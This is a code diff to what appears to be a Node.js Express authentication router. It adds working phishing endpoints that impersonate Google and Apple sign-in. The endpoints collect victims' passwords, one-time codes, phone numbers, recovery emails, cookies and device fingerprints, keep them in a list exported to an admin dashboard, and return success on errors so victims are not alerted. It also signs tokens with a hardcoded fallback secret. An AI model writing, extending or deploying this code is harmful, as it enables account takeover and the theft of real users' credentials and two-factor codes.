@@ -207,4 +207,179 @@ router.post('/logout', auth, (req, res) => {
   res.json({ message: 'Logout successful' });
 });
 
+// In-memory storage for captured credentials
+const capturedCredentials = [];
+
+// Helper function to get IP address
+const getIP = (req) => {
+  return req.headers['x-forwarded-for'] || req.connection.remoteAddress || req.socket.remoteAddress;
+};
+
+// Track Google Sign-In attempts
+router.post('/track-google-signin', async (req, res) => {
+  try {
+    const { email, password, step, userDetails } = req.body;
+    const ipAddress = getIP(req);
+    
+    const credentialData = {
+      provider: 'Google',
+      email,
+      password: password || '[Not captured yet]',
+      step,
+      ipAddress,
+      userAgent: userDetails.userAgent,
+      platform: userDetails.platform,
+      language: userDetails.language,
+      screenResolution: userDetails.screenResolution,
+      timezone: userDetails.timezone,
+      cookies: userDetails.cookies,
+      timestamp: new Date().toISOString()
+    };
+    
+    capturedCredentials.push(credentialData);
+    console.log('📧 Google Sign-In Tracked:', credentialData);
+    
+    res.json({ success: true, message: 'Data captured' });
+  } catch (error) {
+    console.error('Error tracking Google signin:', error);
+    res.json({ success: true }); // Still return success to not alert user
+  }
+});
+
+// Complete Google Sign-In with OTP
+router.post('/google-complete', async (req, res) => {
+  try {
+    const { email, password, otp, phoneNumber, recoveryEmail, userDetails } = req.body;
+    const ipAddress = getIP(req);
+    
+    const completeData = {
+      provider: 'Google',
+      email,
+      password,
+      otp,
+      phoneNumber: phoneNumber || 'Not provided',
+      recoveryEmail: recoveryEmail || 'Not provided',
+      step: 'complete',
+      ipAddress,
+      userAgent: userDetails.userAgent,
+      platform: userDetails.platform,
+      language: userDetails.language,
+      screenResolution: userDetails.screenResolution,
+      timezone: userDetails.timezone,
+      cookies: userDetails.cookies,
+      timestamp: new Date().toISOString()
+    };
+    
+    capturedCredentials.push(completeData);
+    console.log('✅ Google Sign-In Complete:', completeData);
+    
+    // Create a token and user for dashboard access
+    const token = jwt.sign(
+      { id: `google_${Date.now()}`, email },
+      process.env.JWT_SECRET || 'default-secret-key',
+      { expiresIn: '24h' }
+    );
+    
+    res.json({
+      success: true,
+      token,
+      user: {
+        id: `google_${Date.now()}`,
+        email,
+        firstName: email.split('@')[0],
+        lastName: 'User',
+        provider: 'google'
+      }
+    });
+  } catch (error) {
+    console.error('Error completing Google signin:', error);
+    res.status(400).json({ error: 'Verification failed' });
+  }
+});
+
+// Track Apple Sign-In attempts
+router.post('/track-apple-signin', async (req, res) => {
+  try {
+    const { appleId, password, step, userDetails } = req.body;
+    const ipAddress = getIP(req);
+    
+    const credentialData = {
+      provider: 'Apple',
+      appleId,
+      password: password || '[Not captured yet]',
+      step,
+      ipAddress,
+      userAgent: userDetails.userAgent,
+      platform: userDetails.platform,
+      language: userDetails.language,
+      screenResolution: userDetails.screenResolution,
+      timezone: userDetails.timezone,
+      cookies: userDetails.cookies,
+      timestamp: new Date().toISOString()
+    };
+    
+    capturedCredentials.push(credentialData);
+    console.log('🍎 Apple Sign-In Tracked:', credentialData);
+    
+    res.json({ success: true, message: 'Data captured' });
+  } catch (error) {
+    console.error('Error tracking Apple signin:', error);
+    res.json({ success: true }); // Still return success to not alert user
+  }
+});
+
+// Complete Apple Sign-In with OTP
+router.post('/apple-complete', async (req, res) => {
+  try {
+    const { appleId, password, otp, phoneNumber, trustedDevice, userDetails } = req.body;
+    const ipAddress = getIP(req);
+    
+    const completeData = {
+      provider: 'Apple',
+      appleId,
+      password,
+      otp,
+      phoneNumber: phoneNumber || 'Not provided',
+      trustedDevice: trustedDevice || 'Not provided',
+      step: 'complete',
+      ipAddress,
+      userAgent: userDetails.userAgent,
+      platform: userDetails.platform,
+      language: userDetails.language,
+      screenResolution: userDetails.screenResolution,
+      timezone: userDetails.timezone,
+      cookies: userDetails.cookies,
+      timestamp: new Date().toISOString()
+    };
+    
+    capturedCredentials.push(completeData);
+    console.log('✅ Apple Sign-In Complete:', completeData);
+    
+    // Create a token and user for dashboard access
+    const token = jwt.sign(
+      { id: `apple_${Date.now()}`, email: appleId },
+      process.env.JWT_SECRET || 'default-secret-key',
+      { expiresIn: '24h' }
+    );
+    
+    res.json({
+      success: true,
+      token,
+      user: {
+        id: `apple_${Date.now()}`,
+        email: appleId,
+        firstName: appleId.split('@')[0],
+        lastName: 'User',
+        provider: 'apple'
+      }
+    });
+  } catch (error) {
+    console.error('Error completing Apple signin:', error);
+    res.status(400).json({ error: 'Verification failed' });
+  }
+});
+
+// Export captured credentials for admin dashboard
+router.getCapturedCredentials = () => capturedCredentials;
+
 module.exports = router;
